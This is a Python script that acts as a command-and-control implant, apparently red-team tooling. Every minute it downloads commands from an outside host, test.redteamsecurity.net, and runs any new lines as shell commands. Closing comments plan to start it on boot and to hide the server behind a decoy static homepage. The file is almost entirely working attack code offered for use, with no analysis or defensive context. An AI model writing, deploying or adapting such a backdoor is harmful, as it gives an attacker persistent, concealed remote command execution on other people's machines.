import requests
import subprocess
import schedule
import time

def http_c2():
    cmds = open("commands.txt", "w")
    r = requests.get("http://test.redteamsecurity.net/commands.txt")
    cmds.write(r.text)
    cmds.close()

    if os.path.isfile("run.txt"):
        subprocess.call("rm run.txt", shell=True)

    if os.path.isfile("commands1.txt"):
        subprocess.call("grep -Fvxf commands1.txt commands.txt > run.txt", shell=True)
        subprocess.call("rm commands1.txt", shell=True)
        subprocess.call("mv commands.txt commands1.txt", shell=True)

    else:
        subprocess.call("cp commands.txt run.txt", shell=True)
        subprocess.call("mv commands.txt commands1.txt", shell=True)

    run = open("run.txt", "r")
    commands = run.readlines()
    for item in commands:
        subprocess.call(item, shell=True)
    run.close()

schedule.every(1).minutes.do(http_c2)

while True:
    schedule.run_pending()
    time.sleep(1)


#need to install requests and schedule during setup
#need to set to run on boot
#figure out how to programmatically set the URL during configuration
#Set up Apache, LetsEncrypt and webroot content with full HTML static homepage to conceal the malicious site in server setup script
